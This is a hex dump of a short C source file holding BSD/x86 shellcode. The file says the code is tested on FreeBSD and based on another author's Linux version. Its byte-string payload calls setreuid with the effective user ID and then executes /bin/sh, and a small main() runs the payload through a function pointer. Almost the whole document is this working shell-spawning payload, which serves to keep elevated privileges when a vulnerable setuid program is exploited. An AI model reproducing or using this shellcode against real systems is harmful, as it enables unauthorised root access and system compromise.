00000000  2f 2a 0d 0a 20 2a 20 62  73 64 2f 78 38 36 20 73  |/*.. * bsd/x86 s|
00000010  65 74 72 65 75 69 64 2f  65 78 65 63 20 73 68 65  |etreuid/exec she|
00000020  6c 6c 63 6f 64 65 0d 0a  20 2a 0d 0a 20 2a 20 73  |llcode.. *.. * s|
00000030  65 74 72 65 75 69 64 28  67 65 74 65 75 69 64 28  |etreuid(geteuid(|
00000040  29 2c 20 67 65 74 65 75  69 64 28 29 29 20 61 6e  |), geteuid()) an|
00000050  64 20 65 78 65 63 76 65  28 22 2f 62 69 6e 2f 73  |d execve("/bin/s|
00000060  68 22 2c 20 22 2f 62 69  6e 2f 73 68 22 2c 20 30  |h", "/bin/sh", 0|
00000070  29 20 0d 0a 20 2a 20 73  68 65 6c 6c 63 6f 64 65  |) .. * shellcode|
00000080  20 62 61 73 65 64 20 6f  6e 20 68 6b 70 63 6f 27  | based on hkpco'|
00000090  73 20 73 65 74 72 65 75  69 64 2f 65 78 65 63 20  |s setreuid/exec |
000000a0  73 68 65 6c 6c 63 6f 64  65 20 66 6f 72 20 6c 69  |shellcode for li|
000000b0  6e 75 78 0d 0a 20 2a 20  54 65 73 74 65 64 20 6f  |nux.. * Tested o|
000000c0  6e 20 46 72 65 65 42 53  44 0d 0a 2a 2f 0d 0a 0d  |n FreeBSD..*/...|
000000d0  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
000000e0  2e 68 3e 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |.h>..#include <s|
000000f0  74 72 69 6e 67 2e 68 3e  0d 0a 0d 0a 63 68 61 72  |tring.h>....char|
00000100  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 20 3d 0d 0a  | shellcode[] =..|
00000110  20 22 5c 78 33 31 5c 78  63 30 5c 78 62 30 5c 78  | "\x31\xc0\xb0\x|
00000120  31 39 5c 78 35 30 5c 78  63 64 5c 78 38 30 5c 78  |19\x50\xcd\x80\x|
00000130  35 30 22 0d 0a 20 22 5c  78 35 30 5c 78 33 31 5c  |50".. "\x50\x31\|
00000140  78 63 30 5c 78 62 30 5c  78 37 65 5c 78 35 30 5c  |xc0\xb0\x7e\x50\|
00000150  78 63 64 5c 78 38 30 22  20 2f 2f 20 73 65 74 72  |xcd\x80" // setr|
00000160  65 75 69 64 28 67 65 74  65 75 69 64 28 29 2c 20  |euid(geteuid(), |
00000170  67 65 74 75 69 64 28 29  29 3b 0d 0a 20 22 5c 78  |getuid());.. "\x|
00000180  65 62 5c 78 30 64 5c 78  35 66 5c 78 33 31 5c 78  |eb\x0d\x5f\x31\x|
00000190  63 30 5c 78 35 30 5c 78  38 39 5c 78 65 32 22 0d  |c0\x50\x89\xe2".|
000001a0  0a 20 22 5c 78 35 32 5c  78 35 37 5c 78 35 34 5c  |. "\x52\x57\x54\|
000001b0  78 62 30 5c 78 33 62 5c  78 63 64 5c 78 38 30 5c  |xb0\x3b\xcd\x80\|
000001c0  78 65 38 22 0d 0a 20 22  5c 78 65 65 5c 78 66 66  |xe8".. "\xee\xff|
000001d0  5c 78 66 66 5c 78 66 66  2f 62 69 6e 2f 73 68 22  |\xff\xff/bin/sh"|
000001e0  3b 20 2f 2f 20 65 78 65  63 28 2f 62 69 6e 2f 73  |; // exec(/bin/s|
000001f0  68 29 0d 0a 0d 0a 69 6e  74 20 6d 61 69 6e 28 29  |h)....int main()|
00000200  0d 0a 7b 0d 0a 69 6e 74  20 28 2a 66 29 28 29 20  |..{..int (*f)() |
00000210  3d 20 28 69 6e 74 20 28  2a 29 28 29 29 73 68 65  |= (int (*)())she|
00000220  6c 6c 63 6f 64 65 3b 0d  0a 20 70 72 69 6e 74 66  |llcode;.. printf|
00000230  28 22 25 64 5c 6e 22 2c  73 74 72 6c 65 6e 28 73  |("%d\n",strlen(s|
00000240  68 65 6c 6c 63 6f 64 65  29 29 3b 0d 0a 66 28 29  |hellcode));..f()|
00000250  3b 0d 0a 20 72 65 74 75  72 6e 20 30 3b 0d 0a 7d  |;.. return 0;..}|
00000260
